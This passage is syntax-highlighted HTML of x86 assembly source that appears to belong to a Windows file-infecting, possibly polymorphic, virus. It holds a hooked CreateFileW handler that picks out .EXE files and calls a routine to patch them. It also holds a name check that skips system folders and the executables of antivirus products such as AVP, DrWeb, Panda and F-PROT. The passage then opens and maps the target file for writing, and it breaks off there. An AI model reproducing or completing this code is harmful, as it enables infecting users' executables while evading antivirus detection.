                </span><span class="sc5">NewCreateFileWL1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">OldCreateFileWL1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Kern32VxInit</span><span class="sc0">

                </span><span class="sc1">;mov eax,[esp+4+8+pushadd] ;offset to fileName</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">pushadd</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TestFileName</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">OldCreateFileWL1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Patch_File_by_Name</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">OldCreateFileWL1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OldCreateFileW</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TestFileName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
               </span><span class="sc5">EndOfUnic</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc5">EndOfANSI</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">EndOfUnic</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
               </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">TestFileNameL2</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;  preobrazuem imya is unic v asni</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">lodsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">TestFileNameL1</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">TestFileNameL2</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TestFileNameL1</span><span class="sc4">:</span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">
               </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; edi=EndOfString</span><span class="sc0">
               </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EndOfUnic</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EndOfANSI</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; '.EXE' ?</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">ThisIsEXE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">ThisIsNotEXE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ThisIsEXE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Find1stSlash</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
               </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Upcase</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NameTestProc</span><span class="sc0">
               </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
               </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@AV</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RetUnicS</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@AV</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ThisIsNotEXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RetUnicS</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetCurEIP</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">NameTestProc</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'23ME'</span><span class="sc0">  </span><span class="sc1">; \sysytem32\
               je_ @AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'METY'</span><span class="sc0">  </span><span class="sc1">; \system\
               je_ @AV</span><span class="sc0">
               </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'-F'</span><span class="sc0">   </span><span class="sc1">;F-port</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'WA'</span><span class="sc0">   </span><span class="sc1">; AW ?</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0">   </span><span class="sc1">; AV?????</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0"> </span><span class="sc1">;NAV,PAV,RAV,_AVP???</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'BE'</span><span class="sc0"> </span><span class="sc1">;drWeb</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'DN'</span><span class="sc0"> </span><span class="sc1">;PANDA</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ITNA'</span><span class="sc1">;ANTI???</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'FASV'</span><span class="sc1">;VSAF???</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'PWSV'</span><span class="sc1">;VSWP???</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'VASF'</span><span class="sc1">;FSAV???</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
               </span><span class="sc5">@AV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">Upcase</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
              </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">ErrorTrap</span><span class="sc0">
 </span><span class="sc5">UpcaseL2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">UpcaseL3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">UpcaseL1</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">41h</span><span class="sc0">
               </span><span class="sc5">jl_</span><span class="sc0"> </span><span class="sc5">UpcaseL3</span><span class="sc0">
               </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">11011111b</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">UpcaseL3</span><span class="sc0">
</span><span class="sc5">UpcaseL1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ErrorTrap</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">UpcaseL2</span><span class="sc0">
              </span><span class="sc6">nop</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">UpcaseL1</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Find1stSlash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ThisIsEXEL1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; find 1st slash</span><span class="sc0">
               </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">Slash</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">std</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'              ;
</span><span class="sc0">               </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">ThisIsEXEL1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Slash</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RetUnicS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EndOfUnic</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EndOfANSI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Convert</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">std</span><span class="sc0">
               </span><span class="sc6">lodsb</span><span class="sc0">
               </span><span class="sc6">stosw</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
               </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">Convert</span><span class="sc0">
               </span><span class="sc6">cld</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">Patch_File_by_Name</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; in eax=FileName</span><span class="sc0">
</span><span class="sc1">;    edx=TypeString (0-ASNI;1-UNIC)</span><span class="sc0">
  </span><span class="sc5">LastObject</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">LpPackedObject</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">LastObject</span><span class="sc0">        </span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc0">
  </span><span class="sc5">LpNewPolyBady</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">LpPackedObject</span><span class="sc0">    </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">SizeOfNewPolyBady</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">LpNewPolyBady</span><span class="sc0">     </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">Pointer2MapFile</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">SizeOfNewPolyBady</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">HheandleOfMapFile</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">Pointer2MapFile</span><span class="sc0">   </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">FileSize</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">HheandleOfMapFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">@FileHandler</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">FileSize</span><span class="sc0">          </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">SizeLockBuf</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">@FileHandler</span><span class="sc0">      </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SizeLockBuf</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">ANSIL1</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">zSetFileAttributesW</span><span class="sc0">
         </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">ANSIL1</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
  </span><span class="sc5">ANSIL1</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">zSetFileAttributesA</span><span class="sc0">
          </span><span class="sc5">EXEPTION</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; offset 2 File name</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">ANSI</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">zCreateFileW</span><span class="sc0">
          </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">ANSI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">ANSI</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">zCreateFileA</span><span class="sc0">
          </span><span class="sc5">EXEPTION</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@FileHandler</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Error1</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">   </span><span class="sc1">; Получили его размер</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReMapFile</span><span class="sc0">


